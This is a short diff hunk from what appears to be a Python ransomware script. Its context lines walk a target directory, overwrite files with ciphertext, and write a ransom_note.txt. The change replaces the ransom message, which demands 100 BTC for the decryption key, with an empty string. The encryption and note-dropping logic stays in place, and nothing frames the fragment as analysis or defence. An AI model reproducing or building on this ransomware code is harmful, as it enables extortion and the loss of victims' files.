@@ -28,6 +28,6 @@ for root, dirs, files in os.walk(target_dir):
             f.write(ciphertext)
 
 # Create a ransom note with the ransom amount and payment instructions
-note = f'Your files have been encrypted. To get the decryption key, send {100} BTC to the following address: '
+note = f''
 with open(os.path.join(target_dir, 'ransom_note.txt'), 'w') as f:
     f.write(note)
